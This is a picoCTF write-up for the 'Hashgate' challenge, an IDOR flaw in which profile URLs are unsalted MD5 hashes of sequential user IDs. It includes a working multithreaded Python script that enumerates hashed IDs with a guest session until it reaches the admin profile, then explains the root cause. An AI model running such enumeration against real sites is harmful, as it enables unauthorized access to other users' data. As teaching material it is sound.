# Hashgate

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{id0r_unl0ck_e581be16}`

## Summary

An Express portal identifies user profiles by `/profile/user/<hash>`, where the hash looks
random (32 hex characters) but is actually just an unsalted MD5 of the plaintext, sequential
numeric user ID. Since the hash gives no real access control, any account's profile is reachable
by hashing a guessed ID, and the server's differing response for a valid-but-unauthorized ID
versus a nonexistent one turns guessing into a fast, oracle-guided search rather than a blind
one.

## Discovery

Login credentials for a guest account are given directly in the page's HTML source as a comment
(`Email: guest@picoctf.org Password: guest`). Logging in redirects to:

```
Location: /profile/user/e93028bdc1aacdfb3687181f2031765d
```

The profile page itself discloses the account's real numeric ID in its response body:

```
Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.
```

Hashing that disclosed ID confirms the URL scheme immediately:

```
echo -n "3000" | md5sum
e93028bdc1aacdfb3687181f2031765d
```

The hash is simply `MD5(str(user_id))`, nothing else. Requesting a hash for an ID that doesn't
exist returns a distinctly different body, `User not found.`, versus a real ID's `Access level:
...` response, which means the app leaks whether a guessed ID is valid even when the guesser
doesn't have permission to see its contents.

## Proof of Concept

Sweep a plausible ID range, hashing each candidate and watching for any response that isn't
`User not found`:

```python
import requests, hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

cookies = {"session": "<authenticated guest session cookie>"}
base = "http://TARGET/profile/user/"

def check(i):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(base + h, cookies=cookies, timeout=5)
    if "User not found" not in r.text:
        return (i, r.text)

with ThreadPoolExecutor(max_workers=40) as ex:
    for fut in as_completed({ex.submit(check, i): i for i in range(0, 5000)}):
        res = fut.result()
        if res:
            print(res)
```

This surfaces ID `3013` (alongside the already-known guest ID `3000`), whose profile responds
with:

```
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_e581be16}
```

## Root Cause

The application substitutes "hard to guess" for actual authorization. Object identifiers are
looked up purely by a deterministic hash of a low-entropy, sequential value with no ownership or
role check applied to the lookup itself, only cosmetically at the display layer for guest
accounts. Any authenticated session, regardless of its own privilege level, can request any
other user's profile by ID once the derivation scheme (a bare unsalted MD5) is recovered, which
took a single known ID and one hash computation to confirm.

## CWE / OWASP

- **CWE-639**: Authorization Bypass Through User-Controlled Key (IDOR)
- **CWE-330**: Use of Insufficiently Random Values
- **OWASP A01:2021**: Broken Access Control
